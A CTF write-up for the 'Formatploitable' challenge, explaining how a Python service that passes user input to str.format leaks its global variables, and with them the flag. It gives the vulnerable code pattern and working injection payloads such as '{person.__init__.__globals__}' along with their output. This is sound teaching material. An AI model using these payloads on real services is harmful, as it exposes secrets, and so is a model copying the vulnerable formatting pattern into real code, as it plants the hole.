---
title: "Lag'n'Crash CTF: Formatploitable"
date: "2021-03-14T08:13:21Z"
description: "Write-up for Lag'n'Crash CTF challenge, formatploitable"
---
# Challenge Overview
> Our intel says that the flag is a global variable in this python program, yet we cannot retrieve it through normal means.
>
> nc challenge1.lagncrash.com 13028

Connecting to the server we are presented with four options.
```
Welcome to Rafale 1.0!
1) Create profile
2) View badge
3) Patch Notes
4) Exit
```

We can create a profile and provide a name and a bio:
```
(picked option 1)
Enter name: Dave
Welcome Dave! Enter a short biography for your profile:
Hi, I'm Dave
```

We can display our profile:
```
(picked option 2)
╔════════════════════════════════════════════════
║Name : Dave
║Bio  : Hi, I'm Dave
╚════════════════════════════════════════════════
```

We can view patch notes:
```
(picked option 3)
Update 1.0.94795585:
The choice to format your profile has been added!

Example profile: Hi! Im {}, nice to meet you!

Further implementations coming soon!
```

# Solution
This challenge attempts to demonstrate the unsafe nature of Python's `.format()`.
Behind the scenes, the profile is displayed by a script similar to:
```python
class Person:
    def __init__(self, name, profile):
        self.name = name
        self.profile = profile


# Note that s is a socket
# When creating a profile:
name_format = s.recv(1024)
profile_format = s.recv(1024)
person = Person(name_format, profile_format)

# When displaying the profile
name = name_format.format(person=person)
s.sendall(name)
profile = profile_format.format(person=person)
s.sendall(profile)
```

We are expected to guess that the data is formatted using the `person` keyword
argument. Then, using the `Person` object, we access the global variables using
`__globals__`:
```
(picked option 1)
Enter name: Dave
Welcome Dave! Enter a short biography for your profile:
{person.__init__.__globals__}
```
Then, view our profile:
```
(picked option 2)
╔════════════════════════════════════════════════
║Name : Dave
║Bio  : {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7b70094d00>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'Formatploitable.py', '__cached__': None, 'CONFIG': {'FLAG': '{sTr1ng_f0rm4tT1nG_xpl0it3d}'}, 'Person': <class '__main__.Person'>, 'cont': True, 'choice': '2', 'person': <__main__.Person object at 0x7f7b6ffaccd0>}
╚════════════════════════════════════════════════
```

So we can see the flag is `LNC{sTr1ng_f0rm4tT1nG_xpl0it3d}'}`.

# Explanation and other possibilities
## 1. Keyword arguments vs positional arguments
Personally, I had a lot of trouble finding the word that was used because I did
not expect to guess the keyword argument used.

The vulnerability demonstrated here can also be shown through positional
arguments:
```python
# When displaying the profile
name = name_format.format(person)
s.sendall(name)
profile = profile_format.format(person)
s.sendall(profile)
```
Then, the payload will need to be adjusted to:
```
(picked option 1)
Enter name: Dave
Welcome Dave! Enter a short biography for your profile:
{0.__init__.__globals__}
```

## 2. `__globals__` is only accessible by user-defined functions and imported functions
It should be noted that if the given code used is:
```python
# When displaying the profile
name = name_format.format(person.name)
s.sendall(name)
profile = profile_format.format(person.profile)
s.sendall(profile)
```

It is not possible to access the global variables. This is because `__globals__`
is a special attribute given to all [user-defined functions](https://docs.python.org/3/reference/datamodel.html#index-34)
and all [imported functions](https://docs.python.org/3/reference/datamodel.html#index-42).

For example, we have already seen a user-defined function (technically _method_)
in the `Person` object. The same problem will arise for functions:
```python
def hello():
    pass

print(hello.__globals__)
```

Likewise, for imported functions:
```python
import base64
print(base64.b64encode.__globals__)
```
Imported functions will display the `__globals__` for their module.
